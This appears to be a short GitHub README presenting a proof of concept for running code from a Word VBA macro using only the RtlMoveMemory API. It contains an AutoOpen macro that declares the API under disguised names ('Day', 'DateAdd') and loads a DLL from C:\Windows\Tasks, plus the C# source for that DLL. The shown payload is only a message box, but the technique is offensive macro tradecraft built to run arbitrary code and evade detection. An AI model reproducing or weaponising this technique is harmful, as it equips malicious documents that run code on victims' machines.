# ExecuteVBAwithRtlMoveMemory
Execute your VBA macro with RtlMoveMemory only
One can replace the ref to API with:

Private Declare PtrSafe Sub Day Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

VBA NewMacro:
```
Declare PtrSafe Sub DateAdd Lib "C:\Windows\Tasks\MoveMem.dll" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Function Magic() As IUnknown
    MsgBox "Hello ..."
End Function


Sub AutoOpen()
    DateAdd Magic(), &H0, 4
End Sub
```

C# MoveMem.dll contains function RtlMoveMemory:
compile with csc.exe and entrypoint is inserted with .export [1]

```
using System;
using System.Runtime.InteropServices;

namespace Code
{

    public class Program
    {
        public static unsafe void DateAdd(IntPtr Destination, IntPtr Source, byte Length)
        {
            MoveMemory(Destination, Source, Length);
        }

        [DllImport("Kernel32.dll", EntryPoint="RtlMoveMemory", SetLastError=false)]
        static unsafe extern void MoveMemory(IntPtr dest, IntPtr src, byte size);
    }
}
```
